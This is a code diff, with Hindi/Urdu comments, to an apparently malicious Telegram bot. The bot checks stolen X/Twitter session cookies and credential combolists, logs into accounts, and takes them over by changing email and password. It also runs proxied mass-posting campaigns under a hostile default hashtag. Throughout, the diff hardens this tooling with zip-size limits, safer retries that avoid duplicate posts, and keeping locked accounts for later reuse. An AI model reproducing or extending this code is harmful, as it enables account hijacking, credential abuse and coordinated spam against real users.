@@ -68,6 +68,12 @@ REVERIFY_CONC = int(os.getenv("REVERIFY_CONC", "4"))
 DEAD_AFTER = int(os.getenv("DEAD_AFTER", "2"))
 JOB_REAP_MIN = float(os.getenv("JOB_REAP_MIN", "30"))
 ZIP_UPLOAD_MAX = int(os.getenv("ZIP_UPLOAD_MAX", str(45 * 1024 * 1024)))
+# Zip bomb guard: declared uncompressed size per entry / per archive.
+ZIP_MAX_FILE = int(os.getenv("ZIP_MAX_FILE", str(16 * 1024 * 1024)))
+ZIP_MAX_TOTAL = int(os.getenv("ZIP_MAX_TOTAL", str(256 * 1024 * 1024)))
+# Pending login/email codes aur campaign stage kitni der zinda rahen.
+PEND_TTL_MIN = int(os.getenv("PEND_TTL_MIN", "180"))
+CAMP_STAGE_SEC = int(os.getenv("CAMP_STAGE_SEC", str(6 * 3600)))
 # Proxies: sirf X traffic in par jaata hai, Telegram/Supabase direct rehte hain.
 PROXIES_RAW = os.getenv("PROXIES", "")
 PROXY_FILE = os.getenv("PROXY_FILE", "").strip()
@@ -90,7 +96,7 @@ DEFAULT_TAG = "#EvilMarkhors_Fucked_IIT_INDIA"
 ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "7028523300,6120166351").split(",") if x.strip()}
 
 SPLIT = {}
-CTEST = set()
+CTEST = {}  # uid -> jab country test maanga gaya (TTL ke liye)
 TWEET = {}
 CAMPS = {}
 CAMPRUN = {}
@@ -164,6 +170,30 @@ async def janitor_loop():
             if now - st.get("at", now) > JOB_REAP_MIN * 60:
                 STORE_ASK.pop(uid, None)
                 shutil.rmtree(st.get("tmp", ""), ignore_errors=True)
+        # Bina code daale chhode gaye ULP clients band karo, warna sockets
+        # aur memory hamesha ke liye leak hoti hai.
+        for uid, pd in list(PEND.items()):
+            for key, v in list(pd.items()):
+                if now - v.get("at", now) > PEND_TTL_MIN * 60:
+                    try:
+                        await v["client"].aclose()
+                    except Exception:
+                        pass
+                    pd.pop(key, None)
+                    b = BATCH.get(uid)
+                    if b and isinstance(b.get("results"), list):
+                        try:
+                            b["results"][int(key)] = {
+                                "ok": False,
+                                "line": b["lines"][int(key)],
+                                "err": "code_timeout"}
+                        except Exception:
+                            pass
+            if not pd:
+                PEND.pop(uid, None)
+        for uid in list(CTEST):
+            if now - CTEST[uid] > JOB_REAP_MIN * 60:
+                CTEST.pop(uid, None)
 
 
 KEYMAP = {
@@ -215,6 +245,8 @@ FILES = {
                      "TIMEOUT=25\nACC_TIMEOUT=90\nRETRIES=3\nMAX_FILES=5000\n"
                      "MEDIA_WAIT_MAX=300\n"
                      "JOB_REAP_MIN=30\nZIP_UPLOAD_MAX=47185920\n"
+                     "ZIP_MAX_FILE=16777216\nZIP_MAX_TOTAL=268435456\n"
+                     "PEND_TTL_MIN=180\nCAMP_STAGE_SEC=21600\n"
                      "SUPABASE_URL=https://xxxx.supabase.co\nSUPABASE_KEY=service_role_key\n"
                      "DB_TABLE=accounts\nREVERIFY_HOURS=24\nREVERIFY_BATCH=400\n"
                      "REVERIFY_CONC=4\nDEAD_AFTER=2\n"
@@ -343,20 +375,36 @@ def db_url():
 async def db_upsert(client, rows):
     if not db_enabled() or not rows:
         return 0, (None if not rows else "db off")
-    ok = 0
-    for i in range(0, len(rows), 200):
-        chunk = rows[i:i + 200]
+    # Same username do dafa aaya to Postgres ka ON CONFLICT ek hi statement
+    # mein same row ko dobara update nahi kar sakta (error 21000) aur poora
+    # 200-row chunk fail ho jata hai. Last row jeeti.
+    uniq = {}
+    for row in rows:
+        uniq[row.get("username")] = row
+    rows = [r for u, r in uniq.items() if u]
+    if not rows:
+        return 0, "no username"
+
+    async def push(chunk):
         try:
             r = await client.post(
                 db_url(), params={"on_conflict": "username"},
                 headers=db_headers({"Prefer": "resolution=merge-duplicates,return=minimal"}),
                 json=chunk, timeout=TIMEOUT * 2)
             if r.status_code < 300:
-                ok += len(chunk)
-            else:
-                logging.warning("db_upsert %s %s", r.status_code, r.text[:200])
+                return len(chunk)
+            logging.warning("db_upsert %s %s", r.status_code, r.text[:200])
         except Exception:
             logging.exception("db_upsert")
+        if len(chunk) > 1:
+            # Ek kharab row poore chunk ko na girde - aadha aadha retry karo.
+            mid = len(chunk) // 2
+            return await push(chunk[:mid]) + await push(chunk[mid:])
+        return 0
+
+    ok = 0
+    for i in range(0, len(rows), 200):
+        ok += await push(rows[i:i + 200])
     return ok, (None if ok else "upsert fail")
 
 
@@ -477,6 +525,11 @@ def load_store():
         _store = {}
     except Exception:
         logging.exception("store load failed: %s", p)
+        # Kharab file ko overwrite karne se pehle backup rakho.
+        try:
+            shutil.copyfile(p, p + ".corrupt-" + str(int(time.time())))
+        except Exception:
+            pass
         _store = {}
 
 
@@ -530,10 +583,12 @@ def save_batch(uid, force=False):
         return
     BATCH_SAVE[uid] = now
     try:
-        with open(batch_file(uid), "w", encoding="utf-8") as f:
+        p = batch_file(uid)
+        with open(p + ".tmp", "w", encoding="utf-8") as f:
             json.dump({"lines": b["lines"], "results": b["results"], "ok": b["ok"],
                        "fail": b["fail"], "mode": b["mode"],
                        "started": b["started"]}, f)
+        os.replace(p + ".tmp", p)
     except Exception:
         logging.exception("save_batch")
 
@@ -553,7 +608,7 @@ def load_batches():
             continue
         try:
             uid = fn[6:-5]
-            with open(os.path.join(HERE, fn), encoding="utf-8") as f:
+            with open(os.path.join(STATE_DIR, fn), encoding="utf-8") as f:
                 d = json.load(f)
             if d.get("lines"):
                 BATCH[uid] = {"tmp": tempfile.mkdtemp(prefix="em_rec_"), "msg": None,
@@ -691,6 +746,47 @@ def _unique_name(base, used):
     return fn
 
 
+def zip_txt_names(zin, limit=None):
+    """Zip ke .txt entries, size-checked (zip bomb se bachne ke liye).
+
+    Declared file_size central directory se aata hai, isliye read karne se
+    pehle hi pata chal jata hai ke entry kitni bari hai.
+    """
+    out, total = [], 0
+    cap = MAX_FILES if limit is None else limit
+    for n in zin.namelist():
+        if not n.lower().endswith(".txt") or n.endswith("/"):
+            continue
+        try:
+            info = zin.getinfo(n)
+        except KeyError:
+            continue
+        size = int(info.file_size or 0)
+        if size > ZIP_MAX_FILE:
+            raise RuntimeError("zip entry bahut bari hai: " + n
+                               + " (" + str(size // 1048576) + " MB)")
+        total += size
+        if total > ZIP_MAX_TOTAL:
+            raise RuntimeError("zip bahut bara (uncompressed) - chhote batches mein todo")
+        out.append(n)
+        if len(out) >= cap:
+            break
+    return out
+
+
+def zip_read_bytes(zin, name):
+    """Ek entry bounded read (zip bomb se bachne ke liye)."""
+    info = zin.getinfo(name)
+    if int(info.file_size or 0) > ZIP_MAX_FILE:
+        raise RuntimeError("zip entry bahut bari hai: " + name)
+    return zin.read(name)
+
+
+def zip_read_text(zin, name):
+    """Ek entry bounded read; text (utf-8) wapas."""
+    return zip_read_bytes(zin, name).decode("utf-8", "ignore")
+
+
 def hdrs(ck):
     return {"Authorization": "Bearer " + BEARER, "x-csrf-token": ck.get("ct0", ""),
             "x-twitter-active-user": "yes",
@@ -723,15 +819,16 @@ async def get_json(client, ck, url):
             except Exception:
                 b = None
             codes = err_codes(b)
-            # 403 is also used for rate limits / permission issues; only treat it
-            # as auth failure when the body has no other explanation.
-            if codes and not (codes & (DEAD_CODES | LOCKED_CODES | SUSP_CODES)):
-                if attempt >= RETRIES:
-                    return "retry", b
-                await asyncio.sleep(delay)
-                delay *= 2
-                continue
-            return "auth", b
+            # 403 Cloudflare/proxy/rate-limit ka bhi hota hai aur uski body
+            # JSON nahi hoti. Sirf known dead/locked/suspended code ko auth
+            # maano, warna live account DEAD ho kar purge ho jata hai.
+            if codes & (DEAD_CODES | LOCKED_CODES | SUSP_CODES):
+                return "auth", b
+            if attempt >= RETRIES:
+                return "retry", b
+            await asyncio.sleep(delay)
+            delay *= 2
+            continue
         if r.status_code == 429 or r.status_code >= 500:
             if attempt >= RETRIES:
                 return "retry", None
@@ -812,7 +909,8 @@ async def live_check(client, ck):
     st, j = await get_json(client, ck, VERIFY_URL + "&include_email=true")
     if st == "auth":
         st, j = await get_json(client, ck, VERIFY_URL)
-    if st == "ok" and isinstance(j, dict) and not j.get("errors"):
+    if (st == "ok" and isinstance(j, dict) and not j.get("errors")
+            and (j.get("screen_name") or j.get("id_str"))):
         d["Status"] = "LIVE"
         d.update({"Username": j.get("screen_name", ""), "ID": j.get("id_str", ""),
                   "Followers": j.get("followers_count", ""),
@@ -1097,6 +1195,14 @@ async def finish_account(uid, idx, ulp, cl):
         b["fail"] += 1
         await cl.aclose()
         return "fail"
+    if det.get("Status") != "LIVE":
+        # Verify network/timeout ki wajah se confirm nahi hua. Ise success
+        # mat gino - failed.txt mein daalo taake dobara verify ho sake.
+        b["results"][idx] = {"ok": False, "ulp": ulp, "details": det,
+                             "line": b["lines"][idx], "err": "verify_unknown"}
+        b["fail"] += 1
+        await cl.aclose()
+        return "fail"
     res = {"ok": True, "ulp": ulp, "details": det, "line": b["lines"][idx]}
     if b["takeover"] and b["newemail"]:
         ne = alias_email(b["newemail"], det.get("Username") or ulp["username"])
@@ -1108,7 +1214,8 @@ async def finish_account(uid, idx, ulp, cl):
         if res.get("new_email"):
             b["results"][idx] = res
             PEND.setdefault(uid, {})[str(idx)] = {"kind": "email", "client": cl,
-                                                  "ulp": ulp, "idx": idx, "new_email": ne}
+                                                  "ulp": ulp, "idx": idx,
+                                                  "new_email": ne, "at": time.time()}
             return "email_pending"
     if b["takeover"]:
         np = b["newpass"] or gen_pass()
@@ -1162,17 +1269,23 @@ def is_admin(uid):
 
 def parse_buckets(spec):
     out = []
-    for part in spec.split(","):
+    for part in (spec or "").split(","):
         p = part.strip()
         if not p:
             continue
-        if p.endswith("+") and p[:-1].strip().isdigit():
-            out.append((p, int(p[:-1]), None, None))
-        elif "-" in p and p.replace("-", "").isdigit():
-            lo, hi = p.split("-", 1)
-            out.append((p, int(lo), int(hi), None))
-        else:
-            out.append((p, None, None, p.lower()))
+        m = re.match(r"^(\d+)\s*\+\s*$", p)
+        if m:
+            out.append((p, int(m.group(1)), None, None))
+            continue
+        m = re.match(r"^(\d+)\s*-\s*(\d+)$", p)
+        if m:
+            lo, hi = int(m.group(1)), int(m.group(2))
+            if lo > hi:
+                lo, hi = hi, lo
+            out.append((p, lo, hi, None))
+            continue
+        # "2020-" / "-5" / text: crash na karo, exact label ki tarah lo.
+        out.append((p, None, None, p.lower()))
     return out
 
 
@@ -1327,6 +1440,8 @@ async def post_tweet(client, ck, text, media):
         except Exception:
             logging.exception("upload_media")
             media_id = None
+        if not media_id:
+            return [], "MEDIA"
     for i, part in enumerate(parts):
         data = {"tweet_mode": "extended", "status": part or "."}
         if ids:
@@ -1467,6 +1582,7 @@ FAIL_CLASS = {
     "MEDIA": "media upload fail", "THREAD": "thread part fail",
     "DUP": "duplicate status (187)", "LONG": "too long (186)",
     "NET": "network/timeout", "OTHER": "other",
+    "UNKNOWN": "send confirm nahi hua (double post se bachne ke liye retry nahi)",
 }
 RETRYABLE = {"RATE", "NET", "MEDIA", "THREAD", "OTHER"}
 
@@ -1513,7 +1629,7 @@ def load_camps():
             continue
         try:
             uid = fn[5:-5]
-            with open(os.path.join(HERE, fn), encoding="utf-8") as f:
+            with open(os.path.join(STATE_DIR, fn), encoding="utf-8") as f:
                 d = json.load(f)
             base = new_camp()
             base.update(d)
@@ -1630,15 +1746,19 @@ def year_in(year, ranges):
 
 def parse_years(spec):
     out = []
-    for part in spec.split(","):
+    for part in (spec or "").split(","):
         p = part.strip().replace(" ", "")
         if not p:
             continue
-        if "-" in p and p.replace("-", "").isdigit():
-            lo, hi = p.split("-", 1)
-            out.append((int(lo), int(hi)))
+        m = re.match(r"^(\d{1,4})-(\d{1,4})$", p)
+        if m:
+            lo, hi = int(m.group(1)), int(m.group(2))
+            if lo > hi:
+                lo, hi = hi, lo
+            out.append((lo, hi))
         elif p.isdigit():
             out.append((int(p), int(p)))
+        # "2020-" jaise adhoore input ko chup-chaap ignore karo.
     return out
 
 
@@ -1686,17 +1806,29 @@ async def _tweet_req(client, ck, data):
                 "https://api.x.com/1.1/statuses/update.json",
                 headers=dict(hdrs(ck), **{"content-type": "application/x-www-form-urlencoded"}),
                 cookies=ck, data=data, timeout=TIMEOUT)
-        except Exception:
+        except asyncio.CancelledError:
+            raise
+        except (httpx.ConnectError, httpx.ConnectTimeout, httpx.ProxyError):
+            # Request X tak nahi pahunchi - safe retry.
             if attempt >= RETRIES:
                 return None, "NET"
             await asyncio.sleep(delay)
             delay *= 2
             continue
+        except Exception as e:
+            # Read/write timeout ya connection drop: X ne request le li ho
+            # sakti hai. Retry karne se double post ho jata hai.
+            logging.warning("tweet send unknown: %s", e)
+            return None, "UNKNOWN"
         if r.status_code == 200:
             try:
-                return r.json(), None
+                j = r.json()
             except Exception:
-                return {"ok": True}, None
+                j = None
+            if isinstance(j, dict) and j.get("id_str"):
+                return j, None
+            logging.warning("tweet 200 without id_str: %s", (r.text or "")[:200])
+            return None, "UNKNOWN"
         if r.status_code == 429:
             reset = r.headers.get("x-rate-limit-reset")
             wait = delay
@@ -1756,6 +1888,10 @@ async def post_account(client, ck, parts, media, cfg):
         except Exception:
             logging.exception("upload_media")
             media_id = None
+        if not media_id:
+            # Media fail hua to text-only post karne ke bajaye fail report karo,
+            # warna campaign ka media wala post chup-chaap text ban jata hai.
+            return False, [], "MEDIA", False
     for i, part in enumerate(parts):
         data = {"tweet_mode": "extended", "auto_populate_reply_metadata": "false"}
         if part.strip():
@@ -1768,11 +1904,13 @@ async def post_account(client, ck, parts, media, cfg):
             data["media_ids"] = str(media_id)
         j, err = await _tweet_req(client, ck, data)
         if err:
-            if media and not media_id and i == 0 and err == "OTHER":
-                err = "MEDIA"
             if posted and cfg.get("cleanup_partial", True):
-                await delete_ids(client, ck, posted)
-                return False, [], "THREAD", bool(media_id)
+                gone = await delete_ids(client, ck, posted)
+                if gone >= len(posted):
+                    return False, [], "THREAD", bool(media_id)
+                # Cleanup adhoora raha: bache hue IDs wapas do taake
+                # delbatch/report se delete ho sakein.
+                return False, posted, "THREAD", bool(media_id)
             return False, posted, err, bool(media_id)
         try:
             tid = j.get("id_str")
@@ -1932,13 +2070,12 @@ async def run_campaign(u, c, doc):
         await f.download_to_drive(ip)
         accounts = []
         with zipfile.ZipFile(ip) as zin:
-            names = [n for n in zin.namelist() if n.lower().endswith(".txt") and not n.endswith("/")]
+            names = zip_txt_names(zin)
             random.shuffle(names)
-            names = names[:MAX_FILES]
             if cfg.get("limit"):
                 names = names[:cfg["limit"]]
             for n in names:
-                raw = zin.read(n).decode("utf-8", "ignore")
+                raw = zip_read_text(zin, n)
                 _, cookies = parse_cookie_file(raw)
                 accounts.append({"name": os.path.basename(n), "raw": raw,
                                  "ck": cookie_dict(cookies)})
@@ -2135,7 +2272,8 @@ async def reverify_pass(bot, notify=True):
         return None
     async with http_client() as client:
         rows = await db_fetch(client, {"status": "eq.live",
-                                       "last_check": "lt." + now_iso(-REVERIFY_HOURS),
+                                       "or": ("(last_check.lt." + now_iso(-REVERIFY_HOURS)
+                                              + ",last_check.is.null)"),
                                        "order": "last_check.asc.nullsfirst"},
                               limit=REVERIFY_BATCH)
         if not rows:
@@ -2149,6 +2287,11 @@ async def reverify_pass(bot, notify=True):
             ck = row.get("cookies") or {}
             uname = row.get("username")
             if not ck or not uname:
+                # Cookies hi nahi to har pass mein yehi rows scan ko block
+                # karti hain - inhe unknown mark karke live se hata do.
+                if uname:
+                    await db_patch(client, uname, {"status": "unknown",
+                                                   "last_check": now_iso()})
                 return
             async with sem:
                 try:
@@ -2170,8 +2313,14 @@ async def reverify_pass(bot, notify=True):
                         "verified": str(det.get("Verified")).lower() == "true"})
                 elif status == "DEAD":
                     dead += 1
+                    why = (det.get("Reason") or "").lower()
                     fails = int(row.get("fails") or 0) + 1
-                    if fails >= DEAD_AFTER:
+                    if "locked" in why or "suspend" in why:
+                        # Locked/suspended account unlock ho sakta hai - purge
+                        # mat karo, sirf dead mark karke chhodo.
+                        await db_patch(client, uname, {"status": "dead",
+                                                       "last_check": now_iso()})
+                    elif fails >= DEAD_AFTER:
                         dead_names.append(uname)
                         await db_patch(client, uname, {"status": "dead",
                                                        "fails": fails,
@@ -2499,13 +2648,12 @@ async def pmap_progress(prog, fn, items, conc=None):
 # ============================ RUNNERS ============================
 async def process_cookie_zip(ip, op, live, prog, sink=None, uid="0"):
     with zipfile.ZipFile(ip) as zin:
-        names = [n for n in zin.namelist()
-                 if n.lower().endswith(".txt") and not n.endswith("/")][:MAX_FILES]
+        names = zip_txt_names(zin)
         prog.total = len(names)
 
         async def one(name):
             try:
-                raw = zin.read(name)
+                raw = zip_read_bytes(zin, name)
                 out, data, cookies = await rework_cookie(
                     raw.decode("utf-8", "ignore"), client, live)
                 if not cookies:
@@ -2517,7 +2665,7 @@ async def process_cookie_zip(ip, op, live, prog, sink=None, uid="0"):
             except Exception:
                 logging.exception("cookie %s", name)
                 try:
-                    raw = zin.read(name)
+                    raw = zip_read_bytes(zin, name)
                 except Exception:
                     raw = b""
                 return name, None, {}, [], raw
@@ -2558,13 +2706,12 @@ async def process_cookie_zip(ip, op, live, prog, sink=None, uid="0"):
 async def process_verify(ip, op, live, prog, sink=None, uid="0"):
     working, dead, unknown = [], [], []
     with zipfile.ZipFile(ip) as zin:
-        names = [n for n in zin.namelist()
-                 if n.lower().endswith(".txt") and not n.endswith("/")][:MAX_FILES]
+        names = zip_txt_names(zin)
         prog.total = len(names)
 
         async def one(name):
             try:
-                text = zin.read(name).decode("utf-8", "ignore")
+                text = zip_read_text(zin, name)
             except asyncio.CancelledError:
                 raise
             except Exception:
@@ -2674,13 +2821,12 @@ async def process_split(ip, op, cfg, live, prog):
     out = {label: [] for label, _, _, _ in buckets}
     unmatched = []
     with zipfile.ZipFile(ip) as zin:
-        names = [n for n in zin.namelist()
-                 if n.lower().endswith(".txt") and not n.endswith("/")][:MAX_FILES]
+        names = zip_txt_names(zin)
         prog.total = len(names)
 
         async def one(name):
             try:
-                text = zin.read(name).decode("utf-8", "ignore")
+                text = zip_read_text(zin, name)
             except asyncio.CancelledError:
                 raise
             except Exception:
@@ -2737,13 +2883,12 @@ async def process_extract(ip, op, cfg, live, prog):
     filt = cfg["filter"]
     kept, dropped = [], []
     with zipfile.ZipFile(ip) as zin:
-        names = [n for n in zin.namelist()
-                 if n.lower().endswith(".txt") and not n.endswith("/")][:MAX_FILES]
+        names = zip_txt_names(zin)
         prog.total = len(names)
 
         async def one(name):
             try:
-                raw = zin.read(name).decode("utf-8", "ignore")
+                raw = zip_read_text(zin, name)
             except asyncio.CancelledError:
                 raise
             except Exception:
@@ -2816,7 +2961,8 @@ async def run_ulp_batch(uid, lines, prog):
                     PEND.setdefault(uid, {})[str(idx)] = {
                         "kind": "login", "client": cl,
                         "flow_token": info["flow_token"],
-                        "subtask": info["pending"], "ulp": ulp, "idx": idx}
+                        "subtask": info["pending"], "ulp": ulp, "idx": idx,
+                        "at": time.time()}
                     b["results"][idx] = {"ok": False, "line": line, "ulp": ulp,
                                          "pending": info["pending"]}
                     prog.pend += 1
@@ -3536,6 +3682,7 @@ async def camp_cmd(u, c):
             await u.message.reply_text("DB campaign shuru...")
             return
         cfg["stage"] = "cookies"
+        cfg["stage_at"] = time.time()
         save_camp(uid)
         await u.message.reply_text("Ab cookie zip bhejo.")
     elif sub == "reset":
@@ -3583,6 +3730,9 @@ async def tweet_cmd(u, c):
     if not is_admin(uid):
         await u.message.reply_text("Sirf admin.")
         return
+    old = TWEET.get(uid)
+    if old and old.get("tmp"):
+        shutil.rmtree(old["tmp"], ignore_errors=True)
     filt = [to_iso(a) or a.upper() for a in " ".join(c.args).split(",") if a.strip()]
     TWEET[uid] = {"stage": "content", "variants": [], "media": None, "filter": filt, "tmp": None}
     await u.message.reply_text("Compose. Texts bhejo. /tweetgo se aage."
@@ -3623,14 +3773,14 @@ async def run_tweet_batch(u, doc):
         f = await doc.get_file()
         await f.download_to_drive(ip)
         with zipfile.ZipFile(ip) as zin:
-            names = [n for n in zin.namelist() if n.lower().endswith(".txt") and not n.endswith("/")][:MAX_FILES]
+            names = zip_txt_names(zin)
             prog = Progress(msg, len(names), "TWEET")
             prog.phase = "Posting"
             filt, variants = t.get("filter") or [], t.get("variants") or [""]
             async with http_client() as client:
                 for name in names:
                     try:
-                        raw = zin.read(name).decode("utf-8", "ignore")
+                        raw = zip_read_text(zin, name)
                         data, cookies = parse_cookie_file(raw)
                         ck = cookie_dict(cookies)
                         if not ck:
@@ -3694,9 +3844,12 @@ async def run_tweet_batch(u, doc):
         logging.exception("tweet batch")
         await _edit(msg, "Error: " + str(e))
     finally:
-        t2 = TWEET.pop(uid, None)
-        if t2 and t2.get("tmp"):
-            shutil.rmtree(t2["tmp"], ignore_errors=True)
+        # Sirf apni session pop karo - beech mein /tweet se nayi session
+        # ban sakti hai, usko delete nahi karna.
+        if TWEET.get(uid) is t:
+            TWEET.pop(uid, None)
+        if t and t.get("tmp"):
+            shutil.rmtree(t["tmp"], ignore_errors=True)
         shutil.rmtree(tmp, ignore_errors=True)
 
 
@@ -3797,7 +3950,7 @@ async def countrytest_cmd(u, c):
     if not is_admin(u.effective_user.id):
         await u.message.reply_text("Sirf admin.")
         return
-    CTEST.add(str(u.effective_user.id))
+    CTEST[str(u.effective_user.id)] = time.time()
     await u.message.reply_text("Ek cookie .txt bhejo.")
 
 
@@ -3861,6 +4014,9 @@ async def on_media(u, c):
         return
     if t.get("tmp"):
         shutil.rmtree(t["tmp"], ignore_errors=True)
+        # Purani media ka path bhi clear karo, warna upload fail hota rahega.
+        t["tmp"] = None
+        t["media"] = None
     tmp = tempfile.mkdtemp(prefix="twm_")
     path = os.path.join(tmp, "media")
     try:
@@ -3964,6 +4120,7 @@ async def verify_with_store(u, uid, st, choice):
     tmp, ip = st["tmp"], st.get("ip", "")
     if not os.path.exists(ip):
         await _ctx_say(u, "File temp se gayi, dobara bhejo.")
+        shutil.rmtree(tmp, ignore_errors=True)
         await _hard_clear(uid)
         return
     want_db = choice in ("db", "both") and db_enabled()
@@ -4100,12 +4257,10 @@ async def handle_file(u, c, doc):
                 await asyncio.sleep(2)
         if is_zip:
             with zipfile.ZipFile(ip) as z:
-                sample, cnt = "", 0
-                for n in z.namelist():
-                    if n.lower().endswith(".txt"):
-                        cnt += 1
-                        if cnt <= 3:
-                            sample += z.read(n).decode("utf-8", "ignore")
+                names = zip_txt_names(z)
+                sample, cnt = "", len(names)
+                for n in names[:3]:
+                    sample += zip_read_text(z, n)
         else:
             with open(ip, encoding="utf-8", errors="ignore") as fh:
                 sample = fh.read()
@@ -4169,10 +4324,8 @@ async def handle_file(u, c, doc):
         lines = []
         if is_zip:
             with zipfile.ZipFile(ip) as z:
-                for n in z.namelist():
-                    if n.lower().endswith(".txt"):
-                        lines += [l for l in z.read(n).decode("utf-8", "ignore").splitlines()
-                                  if l.strip()]
+                for n in zip_txt_names(z):
+                    lines += [l for l in zip_read_text(z, n).splitlines() if l.strip()]
         else:
             with open(ip, encoding="utf-8", errors="ignore") as fh:
                 lines = [l for l in fh.read().splitlines() if l.strip()]
@@ -4278,16 +4431,24 @@ async def on_text(u, c):
                     await u.message.reply_text((st["ulp"]["username"] or st["ulp"]["email"])
                                                + ": aur ek code.")
                     continue
+                keep = False
                 if r == "ok":
                     res = await finish_account(uid, st["idx"], st["ulp"], st["client"])
                     if res == "email_pending":
+                        # finish_account ne isi key par email entry daali hai,
+                        # isliye login entry ko delete mat karo.
+                        keep = True
                         await u.message.reply_text((st["ulp"]["username"] or st["ulp"]["email"])
                                                    + ": email set, code bhejo.")
                     elif res == "fail":
+                        err = (b["results"][st["idx"]] or {}).get("err")
+                        why = ("cookie dead nikli" if err == "cookie_dead"
+                               else "verify confirm nahi hua (network)")
                         await u.message.reply_text((st["ulp"]["username"] or st["ulp"]["email"])
-                                                   + ": login ok lekin cookie dead nikli.")
+                                                   + ": " + why + ".")
                     else:
-                        b["ok"] += 1
+                        # finish_account khud b["ok"] barhata hai - yahan dobara
+                        # count karne se total galat aata tha.
                         await u.message.reply_text((st["ulp"]["username"] or st["ulp"]["email"])
                                                    + ": done")
                 else:
@@ -4298,7 +4459,8 @@ async def on_text(u, c):
                         await st["client"].aclose()
                     except Exception:
                         pass
-                del pend[key]
+                if not keep:
+                    del pend[key]
                 save_batch(uid)
             elif st["kind"] == "email":
                 ck = dict(st["client"].cookies)
@@ -4330,6 +4492,24 @@ async def finalize_cmd(u, c):
 async def cancel_cmd(u, c):
     uid = str(u.effective_user.id)
     kind = await stop_job(uid)
+    state = CAMPRUN.get(uid)
+    if state is not None:
+        state["stop"] = True
+    st = STORE_ASK.pop(uid, None)
+    if st:
+        shutil.rmtree(st.get("tmp", ""), ignore_errors=True)
+    t = TWEET.pop(uid, None)
+    if t and t.get("tmp"):
+        shutil.rmtree(t["tmp"], ignore_errors=True)
+    SPLIT.pop(uid, None)
+    CTEST.pop(uid, None)
+    ex = EXTRACT.get(uid)
+    if ex:
+        ex["stage"] = "idle"
+    cfg = CAMPS.get(uid)
+    if cfg and not CAMPRUN.get(uid) and cfg.get("stage") in ("text", "media", "cookies"):
+        cfg["stage"] = "idle"
+        save_camp(uid)
     await _hard_clear(uid)
     await u.message.reply_text("Cancel" + (" (" + kind + ")" if kind else ""))
 
@@ -4392,13 +4572,18 @@ async def on_doc(u, c):
     uid = str(u.effective_user.id)
     low = (doc.file_name or "").lower()
     if uid in CTEST and low.endswith(".txt"):
-        CTEST.discard(uid)
+        CTEST.pop(uid, None)
         await country_test(u, doc)
         return
     cfg = CAMPS.get(uid)
-    if cfg and cfg.get("stage") == "cookies" and low.endswith(".zip"):
-        await _spawn(u, "camp", lambda: run_campaign(u, c, doc))
-        return
+    if cfg and cfg.get("stage") == "cookies":
+        if time.time() - cfg.get("stage_at", 0) > CAMP_STAGE_SEC:
+            # Purana stage har naye zip ko campaign samajh leta hai - expire.
+            cfg["stage"] = "idle"
+            save_camp(uid)
+        elif low.endswith(".zip"):
+            await _spawn(u, "camp", lambda: run_campaign(u, c, doc))
+            return
     ex = EXTRACT.get(uid)
     if ex and ex.get("stage") == "await" and low.endswith(".zip"):
         await _spawn(u, "extract", lambda: run_extract(u, doc))
